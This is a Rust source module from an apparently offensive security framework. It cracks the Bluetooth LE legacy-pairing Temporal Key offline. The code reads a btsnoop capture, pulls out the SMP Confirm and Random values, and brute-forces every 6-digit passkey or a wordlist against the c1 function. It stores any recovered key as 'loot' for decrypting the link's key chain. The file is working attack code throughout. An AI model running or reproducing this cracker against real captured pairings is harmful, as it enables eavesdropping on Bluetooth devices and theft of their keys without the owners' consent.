//! LE legacy pairing TK cracker — offline c1 confirmation attack.

use anyhow::Result;

use crate::module::{ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "LE Legacy Pairing TK Cracker".to_string(),
        description: "Offline dictionary attack on the LE legacy-pairing Temporal Key: parses \
                      a btsnoop capture (setg bt_capture=/path), extracts the SMP Pairing \
                      Confirm/Random + Pres/Preq/address bytes and recomputes c1 = AES-CMAC(TK, \
                      r||pres||preq||iat||ia||rat||ra) for every candidate TK (6-digit \
                      passkeys by default, wordlist via setg tk_wordlist). Recovered TKs \
                      decrypt the STK → LTK chain. Pure offline crypto — no radio needed."
            .to_string(),
        authors: vec!["rustsploit contributors".to_string()],
        references: vec!["https://www.bluetooth.com/specifications/specs/".to_string()],
        disclosure_date: None,
        rank: ModuleRank::Great,
        default_port: None,
    }
}

#[cfg(all(feature = "bluetooth", target_os = "linux"))]
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    use crate::bluetooth::btsnoop::{self, SMP_PAIRING_CONFIRM, SMP_PAIRING_RANDOM, SmpPdu};
    use crate::bluetooth::crypto_extra;
    use crate::module::{Finding, FindingKind};

    tracing::trace!("le_legacy_crack capture analysis (target {:?})", ctx.target);

    let mut outcome = ModuleOutcome::ok();

    let path = crate::tenant::resolve()
        .global_options()
        .get("bt_capture")
        .await
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .ok_or_else(|| anyhow::anyhow!("set bt_capture=/path/to/btsnoop first"))?;

    let raw = std::fs::read(&path).map_err(|e| anyhow::anyhow!("reading {path}: {e}"))?;
    let records = btsnoop::parse(&raw)?;
    let smp_pdus: Vec<SmpPdu> = btsnoop::extract_smp(&records);
    crate::mprintln!(
        "[*] {path}: {} records, {} SMP PDUs",
        records.len(),
        smp_pdus.len()
    );

    // Extract the confirm (master + slave) and random pair. For the standard
    // attack we need: c_m (confirm from initiator), r_s (random from
    // responder) → verify against TK with c1.
    let confirm = smp_pdus
        .iter()
        .find(|p| p.opcode == SMP_PAIRING_CONFIRM && !p.sent_by_host)
        .and_then(|p| fixed16(&p.data));
    let random = smp_pdus
        .iter()
        .find(|p| p.opcode == SMP_PAIRING_RANDOM && p.sent_by_host)
        .and_then(|p| fixed16(&p.data));

    let (confirm, random) = match (confirm, random) {
        (Some(c), Some(r)) => (c, r),
        _ => anyhow::bail!(
            "capture lacks the SMP Confirm/Random pair — sniff the legacy pairing first"
        ),
    };
    crate::mprintln!("[*] Confirm: {}", crate::bluetooth::hex(&confirm));
    crate::mprintln!("[*] Random:  {}", crate::bluetooth::hex(&random));

    // Pres/Preq from the Pairing Request/Response PDUs (opcodes 0x01/0x02).
    let pres: [u8; 7] = smp_pdus
        .iter()
        .find(|p| p.opcode == 0x02)
        .map(|p| seven(&p.data))
        .unwrap_or([0u8; 7]);
    let preq: [u8; 7] = smp_pdus
        .iter()
        .find(|p| p.opcode == 0x01)
        .map(|p| seven(&p.data))
        .unwrap_or([0u8; 7]);

    // Candidate TK space: all 6-digit passkeys (default) or a wordlist.
    let candidates: Vec<[u8; 16]> = if let Some(wl) = crate::tenant::resolve()
        .global_options()
        .get("tk_wordlist")
        .await
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
    {
        tokio::task::spawn_blocking(move || -> Result<Vec<[u8; 16]>> {
            let raw = std::fs::read_to_string(&wl)
                .map_err(|e| anyhow::anyhow!("reading {wl}: {e}"))?;
            Ok(raw
                .lines()
                .filter(|l| !l.trim().is_empty())
                .map(|l| {
                    let mut tk = [0u8; 16];
                    let b = l.trim().as_bytes();
                    let n = b.len().min(16);
                    tk[..n].copy_from_slice(&b[..n]);
                    tk
                })
                .collect())
        })
        .await
        .map_err(|e| anyhow::anyhow!("LE legacy TK wordlist loader: {e}"))??
    } else {
        (0u32..1_000_000)
            .map(|passkey| {
                let mut tk = [0u8; 16];
                tk[..4].copy_from_slice(&passkey.to_le_bytes());
                tk
            })
            .collect()
    };

    crate::mprintln!("[*] Brute-forcing {} candidate TKs ...", candidates.len());
    let mut found: Option<[u8; 16]> = None;
    for (i, tk) in candidates.iter().enumerate() {
        if i % 100_000 == 0 && i > 0 {
            crate::mprintln!("  [*] {i} candidates tried ...");
        }
        let computed = match btsnoop::extract_smp_addresses(&records) {
            Ok(addr) => crypto_extra::smp_c1(
                tk,
                &random,
                &pres,
                &preq,
                addr.iat,
                &addr.ia,
                addr.rat,
                &addr.ra,
            )?,
            Err(e) => {
                tracing::debug!(
                    "addresses not in capture, using zero placeholders (TK match unlikely): {e:#}"
                );
                crypto_extra::smp_c1(tk, &random, &pres, &preq, 0, &[0u8; 6], 0, &[0u8; 6])?
            }
        };
        if computed == confirm {
            found = Some(*tk);
            break;
        }
    }

    match found {
        Some(tk) => {
            let hex = crate::bluetooth::hex(&tk);
            crate::mprintln!("[+] TK RECOVERED: {hex}");
            outcome.findings.push(Finding {
                target: path.clone(),
                kind: FindingKind::Credential,
                message: format!("LE legacy TK recovered from {path}: {hex}"),
                data: Some(serde_json::json!({"capture": path, "tk": hex})),
            });
            match crate::loot::store_loot(
                &path,
                "le_tk",
                "LE legacy pairing Temporal Key",
                &tk,
                "creds/bluetooth/le_legacy_crack",
            )
            .await
            {
                Some(id) => crate::mprintln!("[*] TK stored to loot ({id})."),
                None => crate::meprintln!("[!] Failed to persist TK to loot."),
            }
        }
        None => {
            crate::mprintln!("[*] TK not recovered — strong passkey/TK or missing capture fields.")
        }
    }
    Ok(outcome)
}

#[cfg(all(feature = "bluetooth", target_os = "linux"))]
fn fixed16(data: &[u8]) -> Option<[u8; 16]> {
    if data.len() < 16 {
        return None;
    }
    let mut out = [0u8; 16];
    out.copy_from_slice(&data[..16]);
    Some(out)
}

#[cfg(all(feature = "bluetooth", target_os = "linux"))]
fn seven(data: &[u8]) -> [u8; 7] {
    let mut out = [0u8; 7];
    for (i, b) in data.iter().take(7).enumerate() {
        out[i] = *b;
    }
    out
}

#[cfg(not(all(feature = "bluetooth", target_os = "linux")))]
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    tracing::trace!(
        "le_legacy_crack unavailable without bluetooth feature (target {:?})",
        ctx.target
    );
    anyhow::bail!(
        "le_legacy_crack requires the `bluetooth` feature (btsnoop capture analysis via setg bt_capture)."
    )
}

crate::register_native_module!(
    crate::module::Category::Creds,
    "bluetooth/le_legacy_crack",
    native
);
